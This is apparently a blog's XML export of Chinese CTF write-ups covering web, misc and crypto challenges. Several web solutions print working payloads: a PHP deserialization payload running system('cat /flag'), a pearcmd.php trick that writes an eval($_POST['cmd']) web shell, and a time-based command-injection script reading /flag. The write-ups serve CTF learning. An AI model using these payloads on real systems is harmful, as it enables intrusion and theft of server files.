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</code></pre>
<p>显然base64转图片得到二维码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021959651.png?x-oss-process=hzy" alt="image-20221002195900154"></p>
<p>扫码得到密文flag</p>
<p>nc{lmTnc}stWceostsfeo__sf</p>
<p>栅栏密码解码，3</p>
<p>nssctf{Welcome_To_nssctf}</p>
<h2 id="week1calc_jail_beginner_level1">[Week1]calc_jail_beginner_level1</h2>
<p>题目附件如下</p>
<pre><code class="hljs plaintext">#the function of filter will banned some string &#x27;,&quot;,i,b
#it seems banned some payload 
#Can u escape it?Good luck!

def filter(s):
    not_allowed = set(&#x27;&quot;\&#x27;`ib&#x27;)
    return any(c in not_allowed for c in s)

WELCOME = &#x27;&#x27;&#x27;
  _                _                           _       _ _   _                _ __ 
 | |              (_)                         (_)     (_) | | |              | /_ |
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
 | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
              __/ |                          _/ |                                  
             |___/                          |__/                                                                                      
&#x27;&#x27;&#x27;

print(WELCOME)

print(&quot;Welcome to the python jail&quot;)
print(&quot;Let&#x27;s have an beginner jail of calc&quot;)
print(&quot;Enter your expression and I will evaluate it for you.&quot;)
input_data = input(&quot;&gt; &quot;)
if filter(input_data):
    print(&quot;Oh hacker!&quot;)
    exit(0)
print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))
</code></pre>
<p>暂时没绕过去</p>
<h2 id="week2扫不出来的二维码">[WEEK2]扫不出来的二维码</h2>
<p>附件是一个二维码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061814532.png?x-oss-process=hzy" alt="扫不出来的二维码"></p>
<p>扫码之后又是个附件</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061815815.png?x-oss-process=hzy" alt="image-20221006181502761"></p>
<p>附件里是个pdf文件，但是打不开发现是压缩包，解压之后得到一个二维码<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061815567.png?x-oss-process=hzy" alt="正如计算机里只有0和1"></p>
<p>在线二维码扫描得到密文flag</p>
<p><a href="https://demo.dynamsoft.com/barcode-reader/">Online Barcode Scanner | Barcode Reader SDK | Dynamsoft</a></p>
<p>base64解码得到flag</p>
<p>nssctf{I_h0te_the_QRc0de!!!}</p>
<h2 id="week2ez_flow">[WEEK2]ez_flow</h2>
<p>流量文件分析，一个一个找，最终找到flag在login.php</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061826400.png?x-oss-process=hzy" alt="image-20221006182648283"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061826543.png?x-oss-process=hzy" alt="image-20221006182659477"></p>
<p>NSSCTF{Hacker!!!_Y0u_g3t_nny_f10w}</p>
<h2 id="week2ex_word">[WEEK2]ex_word</h2>
<p>拿到附件是一个word，不能正常打开，改成zip解压看看，发现在images下有个图片不能把正常显示，显示二进制发现是PK，即压缩包</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061837625.png?x-oss-process=hzy" alt="image-20221006183732557"></p>
<p>改了之后里面有个flag.xml打开是emoji</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061838236.png?x-oss-process=hzy" alt="image-20221006183805164"></p>
<p>解码得到flag</p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=937">Emoji表情符号编码/解码 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p>
<p>nssctf{t01s_1s_th0_tru3_f1ag}</p>
<h2 id="week2kiana">[WEEK2]Kiana</h2>
<p>两张图片</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061842364.png?x-oss-process=hzy" alt="1"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061842431.png?x-oss-process=hzy" alt="2"></p>
<p>stegsolve异或对比，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210061843738.png?x-oss-process=hzy" alt="image-20221006184308305"></p>
<p>NSSCTF{come_and_play_bh3}</p>
<h2 id="week2baldis-basics">[WEEK2]Baldi’s Basics</h2>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>两小时AK赛</title>
    <url>/2022/07/01/%E4%B8%A4%E5%B0%8F%E6%97%B6AK%E8%B5%9B/</url>
    <content><![CDATA[<p><strong>catf1ag之前的一个比赛，当时因为一些原因没法进行，今天把比赛题复盘一下</strong></p>
<span id="more"></span>
<h1 id="web">web</h1>
<h2 id="签到了你会玩2048么">签到了!!!你会玩2048么?</h2>
<p>f12看到flag</p>
<h2 id="easy_unser">easy_unser</h2>
<ul>
<li>__wakeup绕过序列化漏洞</li>
</ul>
<pre><code class="hljs plaintext">&lt;?php
//flag in /flag
show_source(&#x27;./index.php&#x27;);
class catf1ag&#123;
    public $target=&#x27;flag&#x27;;
    function __wakeup()&#123;
        $this-&gt;target = &quot;catf1ag is CTF platform!&quot;;
    &#125;
    function __destruct()&#123;
        $fp = fopen(&quot;catf1ag.php&quot;,&quot;w&quot;);
        fputs($fp,$this-&gt;target);
        fclose($fp);
    &#125;
&#125;
$a = $_GET[&#x27;catf1ag&#x27;];
$b = unserialize($a);
include &#x27;catf1ag.php&#x27;;

?&gt;
flag</code></pre>
<p>直接序列化</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011855603.png?x-oss-process=hzy" alt="image-20220701185353173"></p>
<pre><code class="hljs plaintext">
O:7:&quot;catf1ag&quot;:1:&#123;s:6:&quot;target&quot;;s:4:&quot;flag&quot;;&#125;</code></pre>
<p>如果存在_wakeup函数，那在调用反序列化方法前会先调用wakeup函数，绕过方法就是让序列化字符串中表示对象属性个数的值大于真实的属性个数！</p>
<p>按照上面的思路来做，就是构造大于代码中的属性，catf1ag的属性的个数值改成2，然后通过target读取flag</p>
<pre><code class="hljs plaintext">O:7:&quot;catf1ag&quot;:2:&#123;s:6:&quot;target&quot;;s:28:&quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot;;&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011906358.png?x-oss-process=hzy" alt="image-20220701190608256"></p>
<h2 id="你猜猜是什么注入">你猜猜是什么注入?</h2>
<ul>
<li>时间注入</li>
</ul>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011915782.png?x-oss-process=hzy" alt="image-20220701191518661"></p>
<p>sql注入不拿手啊，我太菜，这道题不是自己写出来的，借鉴了大佬的wp</p>
<p><a href="https://blog.csdn.net/weixin_53268624/article/details/124680581">(44条消息) catf1ag平台AK赛_想成菜鸡的武阳的博客-CSDN博客</a></p>
<p>放个exp吧</p>
<pre><code class="hljs plaintext">import requests
import time
# s = &quot;&quot;
# for i in range(32,128):
#     s += chr(i)
s = &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;
flag = &quot;&quot;
for i in range(1,50):
    for j in s:
        url = &quot;http://d4662749-0226-4146-826f-84e60e719800.subject.catf1ag.cn:9999//?catf1ag=&quot; + f&quot;sleep `cat /flag | cut -c &#123;i&#125; | tr &#123;j&#125; 2`&quot;
        try:
            print(url)
            requests.adapters.DEFAULT_RETRIES = 5 # 增加重连次数
            requests.get(url,timeout=2)
        except Exception as e:
            print(str(e))
            flag += j
            print(flag)
            break
        time.sleep(2)
print(flag)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011933437.png?x-oss-process=hzy" alt="image-20220701193311315"></p>
<h1 id="misc">MISC</h1>
<h2 id="签签">签签</h2>
<p>拖到010看看发现有base64加密内容<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011920716.png?x-oss-process=hzy" alt="image-20220701192059618"></p>
<p>解码得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011921989.png?x-oss-process=hzy" alt="image-20220701192137821"></p>
<h2 id="奇怪的字符">奇怪的字符</h2>
<p>附件内容是</p>
<pre><code class="hljs plaintext">bcwb4g`slyLMb?ftR~qh</code></pre>
<p>异或，写个脚本</p>
<pre><code class="hljs plaintext">data = open(&#x27;secret.txt&#x27;,&#x27;r&#x27;).read()
a = 1
for i in data:
    print(chr(ord(i)^a),end=&#x27;&#x27;)
    #把txt文件内容中的字符转换成进制 每位与a递增异或，再重新转成字符
    a+=1</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011924011.png?x-oss-process=hzy" alt="image-20220701192419954"></p>
<h2 id="这4什么好看的">这4什么好看的</h2>
<p>这个不会，大佬带带我，不会的就不写了</p>
<h1 id="crypto">CRYPTO</h1>
<h3 id="怎么会多一个呢">怎么会多一个呢</h3>
<p>附件内容是</p>
<pre><code class="hljs plaintext">n=73551482761993440116378276402850976017673970117685879384712768054097267028974244867004238587658366463106703581107613883463180833706377915593443986550610497954246664378469651
e=65537
c=19088340804936031145050310701046663800140062626102387290922890724239533128878474005542684734507475562997222905703018409354867816494925059525377106444000231776165581716296665</code></pre>
<p>exp如下</p>
<pre><code class="hljs plaintext">import libnum
import gmpy2
 
 
n=73551482761993440116378276402850976017673970117685879384712768054097267028974244867004238587658366463106703581107613883463180833706377915593443986550610497954246664378469651
e=65537
c=19088340804936031145050310701046663800140062626102387290922890724239533128878474005542684734507475562997222905703018409354867816494925059525377106444000231776165581716296665
 
p = 4254843227
q = 2492374307
r = 6935768738605665705725288400892432256194550668863095515013942769049162888322407038880737120756913240675144540329112141837524407303580284917764285456453059
phi_n=(p-1)*(q-1)*(r-1)
d=gmpy2.invert(e,phi_n)
m=pow(c,d,n)
print(m)
print(libnum.n2s(int(m)))</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207011935659.png?x-oss-process=hzy" alt="image-20220701193530540"></p>
<p>其他的解密我也不擅长，就不写了，先主攻web</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>黄河流域公安院校网络空间安全技能挑战赛-WEB部分</title>
    <url>/2023/03/04/%E5%85%AC%E5%AE%89/</url>
    <content><![CDATA[<p>黄河流域公安院校网络空间安全技能挑战赛WEB部分题目WP</p>
<span id="more"></span>
<h1 id="web">WEB</h1>
<h3 id="funnyphp">funnyPHP</h3>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230304171754532.png?x-oss-process=hzy" alt="image-20230304171754532"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230304171901619.png?x-oss-process=hzy" alt="image-20230304171901619"></p>
<p>PHP7.4.21存在源码泄露</p>
<p><a href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p>
<p>读到puzzle.php的反序列化源码</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);

class A&#123;
    public $sdpc = [&quot;welcome&quot; =&gt; &quot;yeah, something hidden.&quot;];

    function __call($name, $arguments)
    &#123;
        $this-&gt;$name[$name]();
    &#125;

&#125;


class B&#123;
    public $a;

    function __construct()
    &#123;
        $this-&gt;a = new A();
    &#125;

    function __toString()
    &#123;
        echo $this-&gt;a-&gt;sdpc[&quot;welcome&quot;]; //对大家表示欢迎
    &#125;

&#125;

class C&#123;
    public $b;
    protected $c;

    function __construct()&#123;
        $this-&gt;c = new B();
    &#125;

    function __destruct()&#123;
        $this-&gt;b ? $this-&gt;c-&gt;sdpc(&#x27;welcom&#x27;) : &#x27;welcome!&#x27;.$this-&gt;c; //变着法欢迎大家
    &#125;
&#125;

class Evil&#123;
    function getflag() &#123;
        echo file_get_contents(&#x27;/fl4g&#x27;);
    &#125;
&#125;


if(isset($_POST[&#x27;sdpc&#x27;])) &#123;
    unserialize($_POST[&#x27;sdpc&#x27;]);
&#125; else &#123;
    serialize(new C());
&#125;


?&gt;</code></pre>
<p>调用Evil类的getflag函数即可</p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);

class A&#123;
    public $sdpc = [&quot;sdpc&quot; =&gt; [&quot;Evil&quot;,&quot;getflag&quot;]];


&#125;


class C&#123;
    public $b;
    protected $c;

    function __construct()&#123;
        $this-&gt;c = new A();
        $this-&gt;b =true;
    &#125;

&#125;

echo urlencode(serialize(new C))

?&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230304172504657.png?x-oss-process=hzy" alt="image-20230304172504657"></p>
<p>flag{06a17267-34ab-4a18-b1fb-88cf30daad06}</p>
<h3 id="ezinclude">ezinclude</h3>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(!preg_match(&quot;/data|base64|filter|rot13|input/i&quot;,$_GET[&#x27;sdpc&#x27;]) &amp;&amp; isset($_GET[&#x27;sdpc&#x27;]))&#123;
    include($_GET[&#x27;sdpc&#x27;]);
&#125;else&#123;
    die(&quot;sry&quot;);
&#125; sry</code></pre>
<p>临时文件包含，日志文件，先写入临时文件</p>
<pre><code class="hljs plaintext">?+config-create+/&amp;sdpc=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</code></pre>
<p>再包含利用</p>
<pre><code class="hljs plaintext">?sdpc=file:///tmp/test.php</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230304173722425.png?x-oss-process=hzy" alt="image-20230304173722425"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230304173735947.png?x-oss-process=hzy" alt="image-20230304173735947"></p>
<p>flag{44519a67ffc654e40febc09e20e8e745}</p>
<h3 id="ezphp">ezphp</h3>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
$g = $_GET[&#x27;g&#x27;];
$t = $_GET[&#x27;t&#x27;];
echo new $g($t);</code></pre>
<p>文件包含读</p>
<pre><code class="hljs plaintext">?g=SplFileObject&amp;t=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230304174010830.png?x-oss-process=hzy" alt="image-20230304174010830"></p>
<pre><code class="hljs plaintext">&lt;?php
$flag = &quot;flag&#123;d732eea0-63dc-4909-a9b0-a639d8e18aa6&#125;&quot;;
?&gt;</code></pre>
<h3 id="babyphp">babyphp</h3>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);

$num = $_GET[&#x27;num&#x27;];

if (preg_match(&quot;/\&#x27;|\&quot;|\`| |&lt;|&gt;|?|\^|%|\$/&quot;, $num)) &#123;
           die(&quot;nononno&quot;);
&#125;

if (eval(&quot;return $&#123;num&#125; != 2;&quot;) &amp;&amp; $num == 0 &amp;&amp; is_numeric($num) != true) &#123;
 system(&#x27;cat flag.php&#x27;);
&#125; else &#123;
 echo &#x27;2&#x27;;
&#125;</code></pre>
<blockquote>
<p>0x0即可满足</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230304174630010.png?x-oss-process=hzy" alt="image-20230304174630010"></p>
<p>flag{4ba10880-06a5-4df1-a843-df23b6b13275}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>某CTF内部赛wp</title>
    <url>/2022/06/16/%E5%86%85%E9%83%A8ctf/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不用试了，不想让你们看到的内容" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="cc27d2eda1769a2a438a9b5b571acb83da66f324fdf86d81df47f733e81c53e7">72c43bedeb91218e56032ad7cc5284e3e8711071dc9a93987237bde220ab117f5c8b307abbc5c486e5efac98bff1deb30468074d3aa0eab70750dcbf0354be9b9e63bfe5e785d56d419bf4159772795e794c5a8cc25139e7341103471c9500594aa2eb2a94f1dcfaf1ec55bc8c8637ece0ac7263743c7ccee37c4e2da5c9a05a33fa635bb11007079f392eef1422bd7647f9d78b1515dbad31410f9558654b188116b27828a362036d2a20fb4a813268b505e0a578ca6a489e605d670e08cd1d9b29149e6f3da2557ac588128e7ffa55d779f972423b57ac25dc53cf64923ec2eeae80a50f69802a3ae81aea5aa8e714d0d718b60c0a81f856e0683b75bf1bb6248ce3fcd996a6f86632ea2dff2390823ce68f020aafd57b8863c1ddf4952052cad0ec8b21fd9fb40046acbbab2450f245d17ba4fb38a47498d3174e02e567e52cffd09edd5090602dd70655dc7fcc0af0c4bb87cbb6cfdfcc44d00f1fccaf77bbb3f7aa0bd4efe3df40506354c74fc96f02802505a97fdfa430549a8e9e64e611652dd057c8db2805933fcdc682033d25f51549746166b9c1dae3e76cfc5cfaf55a08426c0289f44edc6a7b7b6e8e12e92f888bc2619ae72d30222ecb46afcca401fedf8aa80787203b61474f2b61e2f1c29726f2d94bcb3cd8ec8d14f045b637f299921c4882553e9fa8c53f09504d8c1492d8109b2fa89ca817c37ef06e7d9908df8a3c1f07955a819e0fee933c844b6e8f6fbc644fa92c54832e5d5b5ef882832654c203ecc6f4cf6bd0876c002762b15c93922ad9d230d7b702d4eb3703cf91f1df9b8a06d33755778476c21298f7bc377504de174d2381afbd98e6a1e3a17e9ad17967db5fe74fb2dfe51fc309ff4e0e673e2b3a84149795c322ccc1b65d484b1af7d22a15dc4b86cd6aa4628b4505ad1314f1aad404e0648e72fc0fe37b69973d3a8ee63da9df134125a18e174358734706840872f2e9ebd70305ebc3ca4f85040584fa1cee09161ee37e061e91ae787155c72d476bc29f31e28ce4c75695d1813cd05317a46949e093af8fa5367e6d14e6bdbef9d1d8bd653535b456dfe2a36f82c2fff3295f97c970a19ef386d8089ed58f086880b519bd6e506e92651e82512ada07f19e2132b73a1d5e9f8bd9aecf3d125f1ba6500a1266f3322a3a5447b42ccf1ac98ba8635c943466c87d36be91fcedf59691cf9faaa9649cf256ec260b3beee8659ca5c54e297cf9d0a76b71e877fbd1840a272258dd9a637945a1cb6bc164978fa8255e3219857edf4bc0b167804e82de3ce4447b3971151ef10f5ca2b7eca72961f4e3498968a9d630e922c9c9d3b4ceda0a7ddc24bc44781de65a5328a2e5689588d65d7992568531ece565c5a29dd4ce8a50846dc5bf7bd3f89942fbc7f6bd4674f2fd40cea5f6ee68e2a686b3f71abb70415d382f2864b21f66cc68f3076139105457314d648b577d95078442a9f9d9026d8424c9e7085e7a45308dc2f1961e3cdfdae081429204d7d15e7fb2fe907e0eb457ac60986258352869691b0cde14c90812c8ab4bbfe236fe065f9274754bbf02931392478c7294a7a0f60258d98d75aea1fa0b9f47b6fc949845b4a590448150b8815bd85244912500a64589785e20f53b2dceca1ecaf9170010857d7f5c36af81561a925525a669448eb7bb981945f2c63ebbc7e8325b0c4d94bb245f546b6c1af633c37c11c632f770a9e788d2bb3afe0d170e2e8d3e6d5b77ccbb5fbac3312e9ae94397f4d4b99cf894eed8c69e9e06bb98e1daa66e6724a4dfba8a6644d7fcd5ade5024c7afb5effc96619378893c265ecf3cb4e4b6eee7305c4e4292bf4ac67b116aa6abe67c2cfa06da765e16ca2224ff5382c6629c67366c9d4f3c3a5020bc04a50e071ab36f1a83c2d6426a618fd2d338555500d2603c0d953ad8b1d4f2feaaf25bdbf48915bcaad7e74afbec4e8ddbaf9a642dad4b7654878143b60673f73e4632140ec1ec74ebabab435101a692cb01257935e8c0d99211fd73ad5827b206305e392ec1a48330a309a5e354fa177a105e7a076824f51f000dcc08ee101addbe168483afa09d67f59ec811c97cdb9fe2bd449574e36ae4af2c5f614815bf49896896d84ce86d70f26302bcece7fb61f6cab924b1417179bbaf3c406e0c549d8b305e99043f14058fc264e325159336c084e6b4836dff325022383b2e46334e1c1858fa5df981295d56f44855f33ce0bc26e35eec34189d2f0dda2f339e663bee16d4a0e645f811144470b41ff819175b30d651b4268d2b6a3f1c359d4607b86ae9bf18e0e97016d02537394a68cf9dde2ee540a4e645205b0ae73131e90cd25fff9ec1fc4f042140576f5b483126510aa525114f1791096c2b6befdf6aebf2c4a757bcde6c62629be338ba064856a07a9438cfe9c986b894bfe6555ca02f3297787f302bd7bbbb7307140cad606957ee9bbbf2a5fdf8939e8d2ff34180c703dd9dcecd92bd359c5d7cdbcede429e65c9b998704d1f24280ad010ed63ea957e88b3646e81747398a706807d3a0d19142d30a1fdc29b13a2c3117f5147dab9ab383eec8089a2867672ed146130153984f9722235f67e5f692d6eeedfa0de886579235c78b343b443ebddf5557f61077c7aab48801f57cf799336caf55f76c90b867c9a5ed819f0f9f3b9ac7c9f1e039bd838dbd0cc3a96393ed27c9af1c5f4683aa24dee0cf5c7509dd768d6740cda696063edfae4ea1587efa8217f143d66edc915f7e6cb583998935f594b765cc0c3d41c165c7b20acf1a342b6500d93ace446763482b1a205326dcc0475c4ead70dedbdbbd5791c3334a72a8b7e3578031454fe72d6df679b3eb5a27a9ccd7e2784bd786d1da562141015c4f6c07fce758b29e9f24303f6cdc1f4bd6b8195c3d5cbeaa52991690bf8077387394b14851972fb728c28c415e4a9f45678c039782aebef104e9af6bf3bf012e74076a36e64437d116d7b42d4df761b77c07d575bac8fb6cdeb745d8609686f2925181c74ff139f581c6596f2259f1a0df472184e4635095c076bf2b3046808967d66ceb50cfadbcb2e8a9ce10990781a3313f8bb203f4f54986e371f27a8b43292efa3e23603f1ab8a61d299b14e4e6e18d28feaec3311d1f942e41b4b8c12f7c12070e18f1676a2988bde03f34ac97adaacb0a5a9f0bd8b88db66615141bfb3b99f2f7c745bcd03a60269371dc68cece4ee2c021e220552d1bb93d72c9463c012942747d0eb8f4bd3654dca7f1d0e99df63ed2178b6ce2e76cc208fa1087bb6b038419d9cefe7e0542f4750c68a1e40e39aa12fed6bf6bbe874d795f3a453e492ba016047402ab52144f488b2397a42afaf44fd3aee3e69f6fb07b14479bae4644a640db555f8bd6695b37a5aa867112436c8c12b9d54d7aebab44b2c9522ad31912ac4ae8208c9bf9b6c70179a2cbc2578e39bd2396a3de968c0506c44765e28b447c9f02878d0a300a7c90d760753de3504f9211632b2d7b33351051e41a176bc1c190b22424a75cb1847ad25fb86e906ba2c76eb49e02ecfab38ea5844db0edfc51f541f68b9de77be1c1b6ca4b7887ea0c7499688c8037fe0f44cdfa112310733e0f3274f2f9cc63d68b07a196ddc74e59909c05311565fea4d4bd11201b84122cf4e09e27ddb89318e1a27e1d9b144a6d8023f1bb0a4ee668c6704bf11ec023e29ed594f29a8c69bdc6b4e41010129b55ab9d3006368e85cc71d3ae785151233df60e1d41c208a4c10f602f3dd10d85bf5a1b403eded1f2799d4a7f285e01fa8031a830f938fb4c337baa49fa3dc2993aeed229a5bd3d608b16cb726328fbd4a76e8cd45394334d612a853da646855644f600ec8400677a3750ffec81b9ec9d34f14b4b6985424435085f243774206486f5a12687d1b1e2dc924f231edcc9363f298175e85da6b75ec2d9592e9e0dd9c22fb004d9a3e419d21f8125ef8a8e847b050624c0c623def3003e2ca626227b73260c8dcab0894c5ab91d943bd83c001e2327795b939b765a620a2c49ed0f8710219eed3c9f5c955386f53a1c63b39063f58178a1ef56901c378ffab7d65e227d5cd8f21fd8bbfcbd3d880db8a1f059d391be77580cc4d513bb5c1eca06e8dce2d76e37ccbab2ad6afcf814480a2487d592f1e8d124210ceb05e3fd4ccd9742de12fbd38081edc53fd9fa237731902650d3d9b0fd211eb46ad6d57a76543526ec25f8a90ae94bb2f8a7d7d58772d4185882cd0df2dc4356da931c5b95a8cdf01564e78b36deb03a33bb014011502198d124995a24f631536508a603602fb729a19f764eb399137a2ed1b8c614833e9400a8f25a8e3bd467b74805412def079c68e90fb85ac019cad61df047c7922e8acee64be2295290f3539d797eb5ef16f7ff736419841e7d98aad23ccf33f486f4a21dd2be5c6d4560c25601245ffc1660171fd630836063f95e4e594411a69e212ed2f0d2e8b5553de959d39a355fac87387938c35e193bd741195d9e26babbef7a330e2cf5458178ef89f137b54d57550c73208c05864f556cb8752f5740d54e644f7962e3ad850bd24f4d8189c79cee566a4710e74114de1